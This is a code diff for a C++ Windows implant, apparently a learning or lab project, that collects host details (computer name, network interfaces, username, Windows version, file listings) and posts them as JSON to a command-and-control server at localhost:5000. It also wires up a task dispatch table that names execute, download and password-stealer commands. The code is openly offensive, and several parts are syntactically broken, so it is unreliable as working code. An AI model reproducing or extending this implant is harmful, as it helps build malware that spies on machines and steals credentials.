@@ -9,7 +9,6 @@
 #include <set>
 #include <memory>
 #include <thread>
-#include <winsock2.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <Lmcons.h>
@@ -31,9 +30,8 @@
 #include <comutil.h>
 #include <Iphlpapi.h>
 
-#include "HTTPRequest.hpp"
-#include "json.hpp"
-//#include <curl/include/curl/curl.h>
+#include "json/include\nlohmann/json.hpp"
+#include <curl/include/curl/curl.h>
 
 using JSON = nlohmann::json;
 
@@ -51,8 +49,7 @@ namespace constants
     #define SLEEP = 10;
 }
 
-/*
-std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool useTLS, std::string verb, std::string payload){
+std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool useTLS){
     std::string result;
     // Your code here
 
@@ -133,6 +130,29 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool us
         }
     }while(dwSize>0);
 
+    // DWORD dwSize = 0;
+    // DWORD dwDownloaded = 0;
+
+    // if(!WinHttpQueryDataAvailable(hRequest, &dwSize)){
+    //     printf("Error in WinHttpQueryDataAvailable: %d", GetLastError());
+    // }
+    // else{
+    //     char outBuffer[4096];
+    //     ZeroMemory(outBuffer, 4096);
+    //     while (WinHttpReadData(hRequest, outBuffer, dwSize, &dwDownloaded)){
+    //         if (dwDownloaded == 0){
+    //             break;
+    //         }
+    //         else {
+    //             for (int i = 0; i < dwDownloaded; i++)
+    //             {
+    //                 result += outBuffer[i];
+    //             }
+    //             memset(outBuffer, 0, 4096);
+    //             dwDownloaded = 0;
+    //         }
+    //     }
+    // }
     result += "\0";
 
     WinHttpCloseHandle(hRequest);
@@ -141,7 +161,7 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool us
 
     return result;
 }
-*/
+
 // int main(int argc,  char* argv[]){
 //     if(argc !=5){
 //         std::cout << "Incorrect number of arguments: you need 4 positional arguments" << std::endl;
@@ -170,6 +190,7 @@ std::string makeHttpRequest(std::string fqdn, int port, std::string uri, bool us
 #define C2 "http://localhost:5000";
 #define REGISTER "/implant/register";
 #define TASK "/implant/task";
+#define SLEEP 10;
 
 std::string random_id() {
     std::string id;
@@ -361,7 +382,6 @@ std::string getPageSize() {
 //   return 0;
 // }
 
-/*
 std::string getWindowsVersion() {
   OSVERSIONINFOEX versionInfo;
   versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
@@ -377,7 +397,6 @@ std::string getWindowsVersion() {
   return version_str;
 }
 
-*/
 /*
 char* getSystemScheduledTasks() {
   // Initialize COM.
@@ -460,7 +479,7 @@ std::map<std::string, std::string> sit_aware(){
     initVals["computerName"] = getComputerName();
     initVals["networkInterfaces"] = getNetworkInterfaces();
     initVals["username"] = getUserName();
-    //initVals["windowsVersion"] = getWindowsVersion();
+    initVals["windowsVersion"] = getWindowsVersion();
     //initVals["machineGUID"] = getMachineGUID();
     initVals["listFiles"] = listFiles();
     initVals["changeDirectory"] = changeDirectory();
@@ -473,12 +492,44 @@ std::map<std::string, std::string> sit_aware(){
     return initVals;
 }
 
-bool isEmpty(const std::map<std::string, std::string>& dictionary) {
-    return dictionary.empty();
+bool send_request(const std::string& url, const std::string& json) {
+    // Create a curl handle
+    CURL* curl = curl_easy_init();
+    if (!curl) {
+        std::cerr << "Error initializing curl handle" << std::endl;
+        return false;
+    }
+
+    // Set the URL and other options
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_POST, 1);
+
+    // Set the payload (i.e., the JSON document)
+    std::stringstream payload;
+    payload << json;
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.str().c_str());
+
+    // Set the content type to application/json
+    struct curl_slist* headers = nullptr;
+    headers = curl_slist_append(headers, "Content-Type: application/json");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+    // Perform the request
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        std::cerr << "Error sending request: " << curl_easy_strerror(res) << std::endl;
+        return false;
+    }
+
+    // Clean up
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+
+    return true;
 }
 
 //register the implant with the C2
-std::string registerImplant(){
+bool registerImplant(){
     //create url that basically concatenates C2 and REGISTER
     std::string url = C2 + REGISTER;
     // --------------DEBUG PRINT----------------
@@ -490,9 +541,6 @@ std::string registerImplant(){
 
     //add the implant_id to the init_data
     init_data["implant_id"] = implant_id;
-    if (isEmpty(init_data)) {
-          return "No implant to register";
-    }
     //print out init_data to see what it looks like
         // --------------DEBUG PRINT----------------
     for (auto const& x : init_data)
@@ -514,21 +562,12 @@ std::string registerImplant(){
     // Print the JSON object
     std::cout << json << std::endl;
 
-//std::string makeHttpRequest(std::string verb, std::string uri, std::string payload, bool useTLS){
-    try
-    {
-      http::Request request{url};
-      const std::string json;
-      const auto response = request.send("POST", json, {
-        {"Content-Type", "application/json"}
-      });
-      return "Implant connected";
+    if(send_request(url, json)){
+        return true;
     }
-    catch(const std::exception& e)
-    {
-      std::cerr << "Request failed: " << e.what() << '\n';
+    else{
+        return false;
     }
-    return "Implant not connected";
 }
 
 // ------------- BEGINNING TO START DEALING WITH TASKS FOR IMPLANT -------------- //
@@ -536,46 +575,18 @@ std::string registerImplant(){
 //make dictionary called dispatch_table
 //------------------THIS HOLDS THE TASKS THAT ARE GONNA BE DISPATCHED TO THE IMPLANT------------------
 //  - when we create a new task, we need to add it to the dispatch_table
-
-/*
 typedef std::string (*Function);
 
 std::map<std::string, Function> dispatch_table;
 //add key value pair to dispatch_table
-  dispatch_table["situational awareness"] = sit_aware;
-  dispatch_table["execute"] = execute;
-  dispatch_table["download"] = download; //file io
-  dispatch_table["steal password"] = stealer; //stealer
+dispatch_table["situational awareness"] = sit_aware;
+// dispatch_table["execute"] = execute;
+// dispatch_table["download"] = download; //file io
+// dispatch_table["steal password"] = stealer; //stealer
 
 //function called task_dispatch that takes in a list of strings called tasks and returns a string
-std::vector<std::string> task_dispatch(const std::vector<std::string>& tasks){
-  std::map<std::string, std::string> results;
-
-  //for each task in tasks
-    for (auto task : tasks){
-        std::string cmd = task["cmd"];
-        std::string args = task["args"];
-        std::string task_id = task["task_id"];
-        //if the there is no cmd or task_id then continue 
-        if (cmd == "" || task_id == ""){
-            continue;
-        }
-        //if the cmd is in the dispatch_table
-        if (dispatch_table.find(cmd) != dispatch_table.end()){
-            //create a string called result that holds the result of the task
-            std::string result = dispatch_table[cmd](args);
-            //add the result to the results list as a key value pair
-
-            results.["task_id"] = task_id;
-            results.["result"] = result;
-        }
-
-    }
-    return results;
-  }
-/*
-
-//initialize empty dictionary of strings called results
+std::string task_dispatch(std::list<std::string> tasks){
+    //initialize empty dictionary of strings called results
 
     std::map<std::string, std::string> results;
 
@@ -601,14 +612,12 @@ std::vector<std::string> task_dispatch(const std::vector<std::string>& tasks){
     }
     return results;
 }
-*/
 
     // const string C2 = "http://localhost:5000";
     // const string REGISTER = "/implant/register";
     // const string TASK = "/implant/task";
 
-/*
-//create a void function called that takes in nothing and returns nothing
+//create a void function called tasking that takes in nothing and returns nothing
 void tasking(){
     //create a string called url that concatenates C2 and TASKING
     std::string url = C2 + TASK;
@@ -660,4 +669,5 @@ void tasking(){
         }
       }
     }
-    */
+
+
